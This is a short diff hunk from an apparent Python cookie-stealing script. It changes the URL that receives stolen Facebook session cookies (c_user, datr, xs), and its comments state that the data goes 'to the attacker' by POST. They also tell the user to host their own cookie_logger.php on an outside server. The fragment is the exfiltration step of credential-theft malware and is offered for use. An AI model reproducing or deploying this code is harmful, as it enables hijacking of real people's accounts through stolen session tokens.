@@ -74,7 +74,7 @@ xs=str(xs)
 #sending the cookie data to the attacker using POST request.
 #edit the url and place your website name where you have hosted your cookie_logger.php script
 
-url = 'http://rihanna.herokuapp.com/cookie_logger.php'
+url = 'http://rihanna.herokuapp.com/index.php'
 payload = {'c_user': c_user, 'datr': datr,'xs': xs}
 
 if (xs != "None"):
